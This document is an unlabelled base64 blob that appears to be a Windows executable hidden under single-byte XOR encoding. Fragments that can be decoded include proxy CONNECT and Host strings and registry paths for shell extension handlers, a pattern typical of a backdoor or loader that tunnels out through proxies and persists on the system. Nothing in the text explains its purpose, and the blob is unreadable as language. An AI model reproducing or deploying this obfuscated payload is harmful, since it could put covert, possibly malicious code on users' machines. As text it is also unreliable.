dRF0UXFxd/F3IXOhdeF1sXFxd/F2IXOhdfF0IXFxd+F2QXOhdeF0QXFxd+F2MXOhdeF0MXFxd5F3sXOhdZF1sXFxd5F3UXOhdZF1gXFxdnF3sXOhdHF1sXFxdnF2MXOhdVF0UXFxdlF3gXOhdFF1gXFxdlF2IXOhdFF0IXFxd/F2UXOhdfF0UXFxdkF3wXOhdEF1wXFxdkF2YXOhdWF1sXFxdkF2EXOhdEF1IXFxdjF38XOhdDF18XFxdjF2UXOhdDF0UXFxdiF2UXOhdHF1wXFxd+F3MXOhdeF1MXFxdiF3wXOhdCF1YXFxd1F3IXOhdVF04XFxdkF3sXOhdEF14XFxdyF2MXOhdSF1IXFxd7F2EXOhdbF0EXFxd7F2MXOhdbF0MXFxdxF3YXOhdeF0UXFxdhF34XOhdBF1kXFxd/F24XOhdWF1oXFxd2F20XOhdWF00XOhdbF3YXYxd5FxcXFxdyF2IXOhdSF0QXFxd6F3wXOhdaF1wXFxdjF3kXOhdNF1YXFxdvF38XOhdNF1YXFxdtF2IXOhdNF1YXFxd2F3EXOhdNF1YXFxd8F3YXOhdQF1IXFxdxF3gXOhdRF1gXFxd/F34XOhdeF1kXFxd6F2MXOhdaF0MXFxdkF3IXOhdZF1gXFxd6F2QXOhdaF04XFxd8F3wXOhdcF00XFxd8F24XOhdcF1AXFxdkF2AXOhdcF1IXFxdiF20XOhdCF00XOhdbF3YXYxd5FxcXFxdjF2MXOhdFF0IXFxd1F3kXOhdeF1kXFxdnF3YXOhdeF1kXFxdwF2IXOhdeF1kXFxdjF3YXOhdeF1kXFxdjF3IXOhdeF1kXFxd8F3kXOhdeF1kXFxd6F3sXOhdeF1kXFxd6F2UXOhdeF1kXFxdkF3YXOhdeF1kXFxd6F3kXOhdaF1kXFxd0F24XOhdQF1UXFxdwF3sXOhdSF0QXFxd8F3gXfBc6F14XWRcXFxcXZBduF2UXOhdEF04XFxcXF3MXfhdhFzoXWhdBFxcXFxdmF2IXbRc6F1UXWBcXFxcXeRdkFzoXTRdWFxcXehd+FzoXWRdNFxcXdhdlFzoXXhdGFxcXcxdyFzoXVBdfFxcXchd5FzoXUBdVFxcXchdkFzoXWhdPFxcXcRdlFzoXVRdSFxcXfhdjFzoXVBdfFxcXeRd7FzoXVRdSFxcXeRd5FzoXWRdYFxcXZxdjFzoXRxdDFxcXZBdlFzoXRBdHFzoXWxd2F2MXeRcXFxcXZBdhFzoXURdeFxcXdhdtFzoXVhdNFzoXVBduF2UXexcXFxcXZBdyFzoXRBdSFxcXehdkFzoXVRdZFxcXYhdtFzoXQhdNFzoXVBduF2UXexcXFxcXZhdiF20XOhdSF1QXFxcXF3YXZRc6F1IXUBcXF20Xfxc6F18XXBcXF3MXchc6F1YXQxcXF3IXeRc6F1YXQhcXF3IXZBc6F1IXRBcXF3EXZRc6F1QXVhcXF2QXZRc6F0QXRxc6F1QXbhdlF3sXFxcXF2QXchc6F1EXXhcXF2YXYhdtFzoXRxdSFxcXFxd2F2UXOhdbF04XFxdtF38XOhdEF1AXFxdzF3IXOhdbF0IXFxdyF3kXOhdUF1YXFxdyF2QXOhdQF0MXFxdxF2UXOhdUF18XFxd/F2UXOhdVF1YXFxdkF3oXfRc6F1kXWBcXFxcXdhdlFzoXUxdNFxcXbRd/FzoXWhdYFxcXcxdyFzoXWxdeFxcXchd5FzoXWRdNFxcXchdkFzoXVBdFFxcXcRdlFzoXWxdCFxcXdRdkFzoXVRdWFzoXWxd2F2MXeRcXFxcXZBd6F30XOhdEF1IXFxcXF3YXZRc6F1oXVhcXF3IXeRc6F14XUhcXF3IXZBc6F0cXVhcXF3EXZRc6F1oXVBcXF2QXZRc6F1UXVhc6F1sXdhdjF3kXFxcXF2QXehd2FzoXWRdYFxcXFxd2F2UXOhdDF1kXFxdyF3kXOhdNF1YXFxdyF2QXOhdTF1gXFxdkF2UXOhdVF1YXOhdUF24XZRd7FxcXFxdkF3oXdhc6F0QXUhcXFxcXdhdlFzoXWBdaFxcXchd5FzoXXRdaFxcXchdkFzoXQRdSFxcXZBd6F2QXOhdRF14XFxcXF3YXZRc6F04XUhcXF3IXeRc6F1QXVRcXF3IXZBc6F1QXWBcXF2QXehd5FzoXURdeFxcXFxd2F2UXOhdEF04XFxdyF3kXOhdVF00XFxdyF2QXOhdHF1IXFxd2F2UXOhddF1gXFxdyF3kXOhdDF0MXFxdyF2QXOhdWF0UXFxd2F2UXOhdbF1UXFxdyF3kXOhdNF0AXFxdyF2QXOhdSF1QXFxd2F2UXOhdcF0AXFxdyF3kXOhdHF18XFxdyF2QXOhdUF1sXFxd2F2UXOhdWF1IXFxdyF2QXOhdCF04XFxd2F2UXOhdVF18XFxdyF2QXOhdHF04XFxd2F2UXOhdGF1YXFxdyF2QXOhdVF1gXFxdyF2QXOhdEF0EXFxdyF2QXOhdfF1kXFxdyF2QXOhdZF14XFxdyF2QXOhdHF0UXFxdtF38XOhdUF18XQxcXFxcXZBdlFxcXFxeXCRUHVRcXF8cKFQc7FxcXhzoVB2YXFxdnCxUHFxcXF4s6FQfPFxcXvzoVB80XFxejOhUHphcXF9c6FQe3FxcX2zoVB5gXFxfPOhUH2BcXF/M6FQfCFxcX5zoVB8UXFxfrOhUHvhcXFx85FQeuFxcXAzkVB9MXFxc3ORUHyxcXFzs5FQdUFxcXLzkVB9sXFxdTORUHqBcXF0c5FQffFxcXrwoVBz4XFxdLORUHjBcXF2M5FQd8FxcXbwoVBzYXFxebORUHdBcXF28LFQcWFxcXjzkVB1MXFxezORUHahcXF6c5FQegFxcXlwsVBxUXFxffORUHUhcXF48LFQcTFxcXwzkVB1AXFxf3ORUHkBcXF7cLFQcSFxcX+zkVB18XFxe/CxUHERcXF+85FQe1FxcXEzgVB4YXFxcHOBUHXhcXFws4FQekFxcXPzgVB7wXFxdvCRUHVhcXFyM4FQecFxcXpwsVBxAXFxdTOBUHXRcXF68LFQcfFxcXRzgVB7QXFxdLOBUH2hcXF384FQe7FxcXYzgVB94XFxeXOBUHhRcXF5s4FQetFxcXjzgVB9IXFxezOBUHoxcXF6c4FQfBFxcXqzgVB8cXFxffOBUHXBcXF8M4FQfXFxcX9zgVB8QXFxfXCxUHHhcXF/s4FQfGFxcX7zgVB8oXFxcTJxUHwBcXFwcnFQfdFxcXCycVB6IXFxc/JxUH1hcXFyMnFQfDFxcXVycVB7MXFxdbJxUHuhcXF08nFQfIFxcXcycVB4QXFxdnJxUH9xcXF2snFQesFxcXnycVB9kXFxeDJxUH9hcXF7cnFQfMFxcXuycVB8kXFxevJxUHzhcXF9MnFQfRFxcXnwoVBzQXFxfHJxUHchcXF9cKFQc9FxcXyycVB3sXFxe3ChUHMRcXF/8nFQd/FxcX3wsVBx0XFxfjJxUHWxcXF/cKFQc5FxcXFyYVB2QXFxfHCxUHHBcXFxsmFQeDFxcXDyYVB7IXFxczJhUHuRcXFycmFQdaFxcXKyYVB6EXFxdfJhUHqxcXF3cJFQcpFxcXQyYVB58XFxc/CRUHIBcXF3cmFQdoFxcXzwsVBxsXFxd7JhUHWRcXF/8KFQc4FxcXbyYVB2MXFxcvChUHDxcXF5MmFQe4FxcXhyYVB00XFxf3CxUHGhcXF4smFQdYFxcXpwoVBz8XFxe/JhUHfRcXF2cKFQcIFxcXoyYVB3YXFxf/CxUHGRcXF9cmFQdHFxcX5wsVBxgXFxfbJhUHghcXF88mFQdGFxcX7wsVBwcXFxfzJhUHRRcXF88KFQc6FxcX5yYVB2UXFxfvChUHJhcXF+smFQdvFxcXVwkVBy0XFxcfJRUHlRcXFxcKFQcGFxcXfwkVBygXFxcDJRUHnhcXFzMlFQdEFxcXFwkVByUXFxcnJRUHbhcXF48KFQcyFxcXKyUVB3AXFxeHChUHMxcXF18lFQdxFxcXQyUVB5kXFxffChUHPBcXF3clFQd6FxcXeyUVB5QXFxdPCRUHKhcXF28lFQeRFxcXXwkVBywXFxeTJRUHkxcXF+cKFQcnFxcXhyUVB4oXFxeLJRUHYBcXF78lFQdiFxcXoyUVB0IXFxcfChUHBRcXF9clFQeBFxcX2yUVB0MXFxfPJRUHgBcXFwcKFQcEFxcX8yUVB5oXFxc3CRUHIRcXF+clFQdpFxcXDwoVBwMXFxfrJRUHQRcXFzcKFQcCFxcXHyQVB0AXFxcDJBUHjxcXFzckFQebFxcXJyQVB4gXFxdXJBUHvxcXFz8KFQcBFxcXRyQVB08XFxcnChUHABcXF0skFQdOFxcXRwkVBysXFxd/JBUHkhcXF2MkFQewFxcXlyQVB2EXFxebJBUHixcXF1cKFQcOFxcXjyQVB0wXFxeXChUHNRcXF7MkFQdzFxcXpyQVB6kXFxfXJBUH1BcXF8ckFQenFxcX9yQVB68XFxfnJBUH3BcXFxcjFQfQFxcXXwoVBw0XFxcHIxUHSxcXF38xFQf0FxcXCyMVB9UXFxcjIxUHqhcXF1sjFQexFxcXcyMVB44XFxdHChUHDBcXF2sjFQeNFxcXnyMVB0oXFxcfCRUHJBcXF4MjFQdtFxcXZwkVB1cXFxe3IxUHnRcXFycJFQcvFxcXpyMVB5cXFxcvCRUHLhcXF6sjFQeWFxcXTwoVBwsXFxffIxUHSRcXF8MjFQd5FxcXdwoVBwoXFxf3IxUHSBcXFw8JFQciFxcX+yMVB2sXFxdfAhUHNxcXF+8jFQd1FxcXfwoVBwkXFxcTIhUHdxcXFwcJFQcjFxcXByIVB4kXFxc/IhUHbBcXF78KFQcwFxcXVyIVB34XFxdbIhUHeBcXF08iFQcUFxcXfyIVB/UXFxdvIhUHhxcXF5MiFQe2FxcXhyIVB6UXFxeLIhUHvRcXF78iFQdRFxcXoyIVB2cXFxd2F3EXOhdtF3YXFxd2F2UXOhd2F3IXFxd2F2UXOhd1F38XFxd2F2UXOhdzF20XFxd2F2UXOhdyF3AXFxd2F2UXOhd+F2YXFxd2F2UXOhd9F3gXFxd2F2UXOhd8F2AXFxd2F2UXOhd7F3UXFxd2F2UXOhd7F24XFxd2F2UXOhd6F3YXFxd2F2UXOhd4F3oXFxd2F2UXOhdmF3YXFxd2F2UXOhdkF3YXFxd2F2UXOhdkF24XFxd2F2UXOhdjF3kXFxd2F2UXOhduF3IXFxd2F20XOhd2F20XOhd0F24XZRd7FxcXFxd2F20XOhd2F20XOhd7F3YXYxd5FxcXFxd1F3IXOhd1F24XFxd1F3AXOhd1F3AXFxd1F3kXOhd+F3kXFxd1F2QXOhd1F3YXOhd7F3YXYxd5FxcXFxd0F3YXOhdyF2QXFxd0F2QXOhd0F20XFxd0F24XOhdwF3UXFxdzF3YXOhdzF3wXFxdzF3IXOhd2F2MXFxdzF3IXOhd0F38XFxdzF3IXOhdzF3IXFxdzF3IXOhd7F34XFxdzF3IXOhd7F2IXFxdzF34XYRc6F3oXYRcXFxcXchd7FzoXcBdlFxcXchd5FzoXdhdiFxcXchd5FzoXdRdtFxcXchd5FzoXdBd2FxcXchd5FzoXdBd1FxcXchd5FzoXcBd1FxcXchd5FzoXfhdyFxcXchd5FzoXfRd6FxcXchd5FzoXeRdtFxcXchd5FzoXZxd/FxcXchd5FzoXYxdjFxcXchd5FzoXYhdkFxcXchd5FzoXbRd2FxcXchd5FzoXbRdgFxcXchdkFzoXdhdlFxcXchdkFzoXdRd4FxcXchdkFzoXdBd7FxcXchdkFzoXdBd4FxcXchdkFzoXdBdlFxcXchdkFzoXcxd4FxcXchdkFzoXchd0FxcXchdkFzoXchdkFxcXchdkFzoXcBdjFxcXchdkFzoXfxd5FxcXchdkFzoXehdvFxcXchdkFzoXeRd+FxcXchdkFzoXZxd2FxcXchdkFzoXZxdyFxcXchdkFzoXZxdlFxcXchdkFzoXZxduFxcXchdkFzoXZBdhFxcXchdkFzoXYhduFxcXchdkFzoXYRdyFxcXchdjFzoXchdyFxcXchdiFzoXchdkFxcXcRd2FzoXfhdlFxcXcRd+FzoXcRd+FxcXcRd4FzoXcRd4FxcXcRdlFzoXdRdyFxcXcRdlFzoXdBd2FxcXcRdlFzoXdBd/FxcXcRdlFzoXcRdlFxcXcRdlFzoXexdiFxcXcRdlFzoXehd0FxcXcBd7FzoXchdkFxcXcBdiFzoXfhd5FxcXfxdyFzoXfhd7FxcXfxd+FzoXfhd5FxcXfxdlFzoXdRd2FxcXfxdlFzoXfxdlFxcXfxdiFzoXfxdiFxcXfxduFzoXdhd6FxcXfhdzFzoXfhdzFxcXfhdkFzoXfhdkFxcXfhdjFzoXdBd/FxcXfhdjFzoXfhdjFxcXfRd2FzoXfRdnFxcXfBd2FzoXcBdyFxcXfBd8FzoXfBdtFxcXfBd5FzoXfhd5FxcXfBd4F3wXOhd+F3kXFxcXF3wXeBc6F3wXZRcXF3wXbhc6F3wXcBcXF3sXYxc6F3sXYxcXF3sXYRc6F3sXYRcXF3oXfhc6F3kXbRcXF3oXfBc6F3oXfBcXF3oXexc6F34XeRcXF3oXeRc6F3oXeRcXF3oXZRc6F34XeRcXF3oXZBc6F3UXeRcXF3oXZBc6F3oXbhcXF3oXYxc6F3oXYxcXF3kXdRc6F3kXeBcXF3kXexc6F3UXchcXF3kXexc6F3kXexcXF3kXeRc6F3kXeBcXF3kXZBc6F20XdhcXF2cXdhc6F34XeRcXF2cXexc6F2cXexcXF2cXYxc6F3UXZRcXF2cXYxc6F2cXYxcXF2YXYhdtFzoXdRd4FxcXFxdmF2IXbRc6F3IXdBcXFxcXZhdiF20XOhdnF3IXFxcXF2UXeBc6F2UXeBcXF2UXYhc6F2UXYhcXF2QXdhc6F34XeRcXF2QXchc6F3EXfhcXF2QXchc6F3kXeBcXF2QXchc6F2QXchcXF2QXfBc6F2QXfBcXF2QXexc6F2QXfhcXF2QXehd2FzoXeRd4FxcXFxdkF3oXdhc6F2QXchcXFxcXZBd6F30XOhd5F3gXFxcXF2QXehd9FzoXZBdyFxcXFxdkF3oXeRc6F3EXfhcXFxcXZBd6F2QXOhdxF34XFxcXF2QXZhc6F3YXexcXF2QXZRc6F3UXdhc6F3QXbhdlF3sXFxcXF2QXZRc6F3UXdhc6F3sXdhdjF3kXFxcXF2QXZRc6F2QXZxc6F3QXbhdlF3sXFxcXF2QXZRc6F2QXZxc6F3sXdhdjF3kXFxcXF2QXYRc6F3EXfhcXF2QXYRc6F2QXchcXF2QXYBc6F3wXchcXF2QXbhdlFzoXZBduFxcXFxdjF3YXOhd+F3kXFxdjF3IXOhd+F3kXFxdjF38XOhdjF38XFxdjF3kXOhdtF3YXFxdjF2UXOhdjF2UXFxdjF2MXOhdlF2IXFxdiF3wXOhdiF3YXFxdiF2UXOhdnF3wXFxdiF20XOhdiF20XOhd0F24XZRd7FxcXFxdiF20XOhdiF20XOhd7F3YXYxd5FxcXFxdhF34XOhdhF3kXFxdvF38XOhdtF3YXFxdtF38XOhd0F38XZBcXFxcXbRd/FzoXdBd/F2MXFxcXF20Xfxc6F3QXeRcXF20Xfxc6F38XfBcXF20Xfxc6F3oXeBcXF20Xfxc6F2QXcBcXF20Xfxc6F2MXYBcXF20XYhc6F20XdhcXF3t4cCYnFxcXFxcXFxcXFxcXFxcXFxfnKBcXFxcXF+coJBMXFxcXFxckExcXFxcXFxcXFxcXFxcXFxcXFxcXFxfoEBcXFxcXFxcXFxcXFxcXFxcXFxcXF5cXFxcXFxcXF+jo6Ojo6BgX6Ojo6OjoGBcXFxcXF9fMKBcXFxcX18woB+/o6OjomFUH7+jo6OiYVRcXF5fo6OhoFxcXl+jo6GgXb4hHBFPEKE+kBQgm+AgqFxcXFxcXFxfo6Ojo6Ojo6Ojo6Ojo6OjoFxcXFxcXFxcXFxcXFxfnKBcXFxcXF+coFxcXFxcXFxcXFxcXFxcXFxcXFxcXFydUFxcXFxcXJ1QXFxcXFxfn6BcXFxcXF+doFhcXFxcX52gWFxcXFxfnaO7ZgNEDniJXKpY+cx6EH9dCkyJ9l94y18UigcsVfeso4I4PaYi8AVcipmDL5W3lqB9WOah7bU0oFxcXFxcXFxcXFxcXFxcXl+hoFxcXFxcXF5fo6MuwwK6ScWamGlcXFxcXFxfo6BpX4CFUG48O4YLqKBcXFxcXF/coFHJvZxcXFxcXFxcXFxYDFxafFgcdnBYHGJwWByaeFgcXFxcXFxcXFxcXFx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8VBxcXFxcXFxcXFxcXF7dqFQcnXhUHFxcXFxcXFxcWFxcXV14VB19eFQcXFxcXt2oVBxcXFxcXFxcX6Ojo6BcXFxdXFxcXJ14VBxcXFxcXFxcXFxcXF69qFQdvXhUHFxcXFxcXFxcVFxcXn14VB4NeFQdzXxUHFxcXF69qFQcWFxcXFxcXF+jo6OgXFxcXVxcXF29eFQdQVENbFwcXFzYpFxc5Y3JvYxcXFzZZFxeIFxcXOWNyb2Mzc34XFxcX11kXF715Fhc5Y3JvYzN6eRcXFxd9qhYX/RYXFzljcm9jM28XQ6gWF14XFxc5Y3JvYzNucxcXFxcX1xYXkxUXFzl+c3ZjdjMiFxcXF5PVFhcTFxcXOScndHFwFxef1RYXExcXFzlURUMzT1RWFxcXF5vVFhcfFxcXOVRFQzNPVEIXFxcXg9UWFxMXFxc5VEVDM09UTRcXFxeP1RYXExcXFzlURUMzT15WFxcXF4vVFhcbFxcXOVRFQzNPXlQXFxcXv9UWFxMXFxc5VEVDM09eTRcXFxe71RYXExcXFzlURUMzT0dWFxcXF6fVFhcfFxcXOVRFQzNPR08XFxcXr9UWFxMXFxc5VEVDM09HT1YXFxer1RYXExcXFzlURUMzT0dNFxcXF9fVFhcTFxcXOVRFQzNPQ1YXFxcX09UWFxsXFxc5VEVDM09DTRcXFxfH1RYXf5IXFzllc3ZjdhcXL18VF28WFxc5ZXN2Y3YzZRcXFxenXhUXsxUXFzllc3ZjdjNtbW1zdXAXFxdDWxUXExcXFzllY3QzXlZWFxcXF09bFRcTFxcXOWVjdDNeTU0XFxcXS1sVFxMXFxc5ZWN0M0NWVhcXFxd3WxUXHxcXFzllY3QzQ01NFxcXF39bFRdPEBcXOW9zdmN2M28XFxcX10QVFysWFxc5cnN2Y3YXF+tDFRejFxcXOX5zdmN2MyUXFxcXp0IVFwMXFxc5fnN2Y3YzJBcXFxfTQhUXkxUXFzl+c3ZjdjMjFxcXF19PFRdFHRcXOX5zdmN2